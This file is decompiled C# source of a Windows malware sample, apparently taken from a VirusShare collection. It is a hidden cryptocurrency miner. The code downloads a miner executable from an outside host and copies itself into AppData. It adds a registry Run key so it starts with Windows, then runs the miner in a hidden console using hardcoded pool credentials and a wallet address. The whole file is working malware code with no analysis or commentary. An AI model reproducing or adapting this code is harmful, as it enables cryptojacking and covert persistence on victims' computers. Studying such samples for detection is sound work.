// Decompiled with JetBrains decompiler
// Type: Main
// Assembly: Miner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FAF6F237-F529-40A8-8341-0DAB01019609
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-d6b1e5b4669bd760ad8e2c00dfb074d975e519ff22dcfd0d0ddf3a49e274ab2a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

[StandardModule]
internal sealed class Main
{
  private static string EXE_PATH = Path.Combine(Interaction.Environ("AppData"), "winminer.exe");
  private static string MINER_URL = "http://filehostonline.com/files/25/bitcoin-miner.exe";

  private static void Download()
  {
    using (WebClient webClient = new WebClient())
      webClient.DownloadFile(global::Main.MINER_URL, global::Main.EXE_PATH);
  }

  public static void Start(string Pool, string Username, string Password, int nCores, bool GPU = false)
  {
    if (!System.IO.File.Exists(global::Main.EXE_PATH))
      global::Main.Download();
    int num = nCores;
    Process process = new Process();
    ProcessStartInfo startInfo = process.StartInfo;
    startInfo.FileName = "cmd.exe";
    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
    startInfo.CreateNoWindow = true;
    if (GPU)
      startInfo.Arguments = string.Format("/c " + global::Main.EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g yes", (object) Pool, (object) Username, (object) Password, (object) num);
    else
      startInfo.Arguments = string.Format("/c " + global::Main.EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g no", (object) Pool, (object) Username, (object) Password, (object) num);
    process.Start();
  }

  public static void Close()
  {
    Process[] processesByName = Process.GetProcessesByName("winminer");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      checked { ++index; }
    }
  }

  [STAThread]
  public static void Main()
  {
    try
    {
      global::Main.Close();
      System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, Interaction.Environ("AppData") + "\\winsrv.exe");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("winsrv.exe", (object) (Interaction.Environ("AppData") + "\\winsrv.exe"));
      string Pool = "http://pool.bitclockers.com:8332";
      string Username = "Jaergo";
      string Password = "nintendo2";
      int num = 70;
      bool GPU = true;
      int nCores = checked ((int) Math.Round(unchecked ((double) Environment.ProcessorCount / 100.0 * (double) num - 1.0)));
      global::Main.Start("http://mining.eligius.st:8337", "1D6PPTTjcuBgnixmxYb5nXMtPjixrhnPnt", "x", 1);
      global::Main.Start(Pool, Username, Password, nCores, GPU);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
